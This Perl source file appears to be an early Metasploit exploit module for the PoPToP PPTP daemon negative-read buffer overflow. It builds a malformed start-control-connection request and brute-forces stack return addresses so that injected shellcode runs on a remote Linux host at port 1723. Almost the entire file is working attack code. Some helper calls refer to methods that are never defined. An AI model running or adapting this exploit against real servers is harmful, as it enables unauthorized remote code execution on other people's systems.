package Msf::Exploit::PoPToP_Negative_Read;
use strict;
use base 'Msf::Exploit';

# we could overwrite a lot, so incase we can't fit before the ret
# we could most likely fit after.
# Right now this only fits sub 200 byte shellcode

my $defaults = {
  'StackTop'    => ['0xbffffa00', 'Start address for stack ret bruteforcing'],
  #'stackTop'    = [0xbffff804, ''];
  'StackBottom' => ['0xbffff000', 'End address for stack ret bruteforcing'],
  'StackStep'   => [8, 'Step size for ret bruteforcing'],
  'BruteWait'   => [.2, 'Length in seconds to wait between brute force attempts'],
    # calculated at 228,  fudge to make more universal
  'RetLength'   => [220, 'Space before the we start writing rets'],
    # shellcode seems to get zero'd at around 180
  'Length'      => [252, 'Length of entire \'payload\', rets filled between retLength and length'],
};

my $info = {
  'Name'  => 'PoPToP Negative Read Overflow',
  'Version'  => '0.1',
  'Author'  => '.',
  'Arch'  => [ 'x86' ],
  'OS'    => [ 'linux' ],
  'Priv'  => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The poptop port', 1723],
    },
  'Payload' =>
    {
      'Size'      => 0, # We need to set this in new, since its user configurable
      'BadChars'  => "", # Eh, we don't have any
      'Prepend'   => "\x81\xC4\xC0\xFB\xFF\xFF", # add esp,0xfffffbc0 (-1088)
    },
  'Description'  =>  
        'PoPToP Negative Read Buffer Overflow affecting '.
        'versions prior to 1.1.4-b3 and 1.1.3-20030409. '.
        'The daemon forks, so we can hit as many times as '.
        'we need to. However, you can only hold 4 concurrent '.
        'processes (so 4 concurrent connectbacks and you won\'t hit anyore '.
        'until you free one). It does a fork() and then exec() so '.
        'so the stack should be pretty similar each attempt. '.
        'We can only fit about 200 bytes of shellcode',
  'Refs'  =>
    [
      'http://securityfocus.com/archive/1/317995',
      'http://www.freewebs.com/blightninjas/',
    ],
  'Targets' =>
    [
      ['Bruteforce', ''],
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Defaults' => $defaults}, @_);
  $info->{'Payload'}->{'Size'} = $self->GetVar('RetLength');
  return($self);
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $shellcode   = $self->_EncodedPayload->Payload;

  my $header = poptop::protocol::header->new;
  $header->setPptpType($header->{'PPTP_CTRL_MESSAGE'});
  $header->setCtrlType($header->{'START_CTRL_CONN_RQST'});
  $header->setMagic(0x1a2b3c4d);
  $header->setLength(1); # length of start_ctrl_conn_rqst
  my $headerPayload = $header->buildHeader;
  my $pptp = poptop::protocol->new;
  my $ctrlPayload = $pptp->build_start_ctrl_conn_rqst(
    $pptp->build_version('1.0'), 0, 0, 0, 1, 1, 'drawesome', 'drawesome');

  my $left = $self->GetLocal('Length') - length($shellcode);
  my $count = 0;
  open(FUCK, ">fuck");
  print FUCK $shellcode;
  close(FUCK);

  my $bruteWait = $self->GetLocal('BruteWait');
  for(my $ret = hex($self->GetLocal('StackTop')); $ret >= hex($self->GetLocal('StackBottom')); $ret -= $self->GetLocal('StackStep')) {
    my $sock = Pex::Socket->new();
    if(!$sock->tcp($targetHost, $targetPort)) {
      $self->FatalError($sock->get_error);
      return;
    }

    $self->PrintLine(sprintf("Trying %#08x", $ret));
    $sock->send($headerPayload . $ctrlPayload . $shellcode . (pack('l', $ret) x int($left / 4)));
    $sock->close;
    select(undef, undef, undef, $bruteWait); # ghetto sleep
  }
  exit(0);
}

package poptop::protocol::header;
use strict;

sub new {
  my $class = shift;
  return(bless(
    {
      'length' => '0',
      'pptpType' => @_ ? shift : 0,
      'magic' => @_ ? shift : 0,
      'ctrlType' => @_ ? shift : 0,
      'reserved' => @_ ? shift : 0,
      'leftover' => '',
      'PPTP_CTRL_MESSAGE'    => 1,
      'START_CTRL_CONN_RQST' => 1,
      'START_CTRL_CONN_RPLY' => 2,
      'STOP_CTRL_CONN_RQST'  => 3,
      'STOP_CTRL_CONN_RPLY'  => 4,
      'ECHO_RQST'            => 5,
      'ECHO_RPLY'            => 6,
    },
  $class));
}

sub getLength {
  my $self = shift;
  return($self->{'length'});
}
sub setLength {
  my $self = shift;
  return($self->{'length'} = shift);
}
sub getPptpType {
  my $self = shift;
  return($self->{'pptpType'});
}
sub setPptpType {
  my $self = shift;
  return($self->{'pptpType'} = shift);
}
sub getMagic {
  my $self = shift;
  return($self->{'magic'});
}
sub setMagic {
  my $self = shift;
  return($self->{'magic'} = shift);
}
sub getCtrlType {
  my $self = shift;
  return($self->{'ctrlType'});
}
sub setCtrlType {
  my $self = shift;
  return($self->{'ctrlType'} = shift);
}
sub getReserved {
  my $self = shift;
  return($self->{'reserved'});
}
sub setReserved {
  my $self = shift;
  return($self->{'reserved'} = shift);
}
sub getLeftover {
  my $self = shift;
  return($self->{'leftover'});
}

# struct pptp_header {
#   u_int16_t length;               /* pptp message length incl header */
#   u_int16_t pptp_type;            /* pptp message type */
#   u_int32_t magic;                /* magic cookie */
#   u_int16_t ctrl_type;            /* control message type */
#   u_int16_t reserved0;            /* reserved */
# };
sub buildHeader {
  my $self = shift;

  return(
    pack('n', $self->getLength).
    pack('n', $self->getPptpType).
    pack('N', $self->getMagic).
    pack('n', $self->getCtrlType).
    pack('n', $self->getReserved)
  );
}

sub parseHeader {
  my $self = shift;
  my $data = shift;

  $self->setLength(unpack('n', substr($data, 0, 2)));
  $self->setPptpType(unpack('n', substr($data, 2, 2)));
  $self->setMagic(unpack('N', substr($data, 4, 4)));
  $self->setCtrlType(unpack('n', substr($data, 8, 2)));
  $self->setReserved(unpack('n', substr($data, 10, 2)));
  $self->setLeftover(substr($data, 12));
}

1;
package poptop::protocol;
use strict;


my %define = (

);

sub new {
  return(bless(
    {
      'MAX_HOSTNAME_SIZE'    => 64,
      'MAX_VENDOR_SIZE'      => 64,
    },
  shift));
}


# struct pptp_start_ctrl_conn_rqst {
#   struct pptp_header header;      /* pptp header */
#   u_int16_t version;              /* pptp protocol version */
#   u_int16_t reserved1;            /* reserved */
#   u_int32_t framing_cap;          /* framing capabilities */
#   u_int32_t bearer_cap;           /* bearer capabilities */
#   u_int16_t max_channels;         /* maximum channels */
#   u_int16_t firmware_rev;         /* firmware revision */
#   u_int8_t hostname[MAX_HOSTNAME_SIZE];   /* hostname */
#   u_int8_t vendor[MAX_VENDOR_SIZE];       /* vendor */
# };

sub build_version {
  my $self = shift;
  my $version = shift;
  my ($major, $minor) = split('\.', $version);
  return(chr($major) . chr($minor));
}

sub build_start_ctrl_conn_rqst {
  my $self = shift;
  my $version = shift;
  my $reserved = shift;
  my $framing_cap = shift;
  my $bearer_cap = shift;
  my $max_channels = shift;
  my $firmware_rev = shift;
  my $hostname = shift;
  my $vendor = shift;

  $hostname = trunc_pad($hostname, $self->{'MAX_HOSTNAME_SIZE'});
  $vendor = trunc_pad($vendor, $self->{'MAX_VENDOR_SIZE'});

  return(
    $version.
    pack('n', $reserved).
    pack('N', $framing_cap).
    pack('N', $bearer_cap).
    pack('n', $max_channels).
    pack('n', $firmware_rev).
    $hostname.
    $vendor
  );
}


# struct pptp_echo_rqst {
#   struct pptp_header header;      /* header */
#   u_int32_t identifier;           /* value to match rply with rqst */
#   char buf[10000];
# };
sub build_echo_rqst {
  my $self = shift;
  my $identifier = shift;
  my $data = shift;

  return(
    pack('N', $identifier) .
    $data
  );
}

# struct pptp_reply {
#   struct pptp_header header;      /* header */
#   char buf[10000];
# };
sub parse_reply {
  my $self = shift;
  my $data = shift;
  return($self->parse_pptp_header($data));
}

sub trunc_pad {
  my $string = shift;
  my $length = shift;
  my $pad = @_ ? shift : "\x00";

  return(substr($string, 0, $length) . ($pad x ($length - length($string))));
}
1;
